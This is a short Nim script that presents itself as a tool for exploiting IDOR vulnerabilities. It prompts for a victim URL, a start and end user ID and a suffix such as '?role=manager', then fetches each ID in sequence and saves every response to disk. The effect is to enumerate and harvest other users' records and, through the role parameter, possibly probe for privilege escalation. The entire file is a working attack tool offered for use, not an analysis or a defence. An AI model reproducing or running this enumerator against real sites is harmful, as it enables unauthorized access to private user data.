import httpclient
import strutils

echo "\nApplication used for the purpose of exploiting the idor vulnerability"
echo "For example: https://victim.domain/index.ext?id=3?role=manager"
echo "---URL: https://victim.domain/index.ext?id="
echo "---if you get user id from 5 - 10, Please enter: "
echo "|__startID = 5"
echo "|__endID = 10"
echo "---Suffix: ?role=manager"
echo "\n\n"

echo "Enter url: "
var url = readLine(stdin)
#echo "Enter user id: "
#var uid: int = readLine(stdin)
echo "Enter start id: "
var startID = readLine(stdin)
echo "Enter end id: "
var endID = readLine(stdin)
echo "Enter suffix: "
var suffix = readLine(stdin)

proc getWebContent(url: string): string =
    var client = newHttpClient()
    var content = client.getContent(url)
    return content

for id in countup(parseInt(startID), parseInt(endID)):
    var urlcompleted: string = url & $id & suffix
    var content = getWebContent(urlcompleted)
    writeFile("file" & $id & ".htm", content)


echo "done"
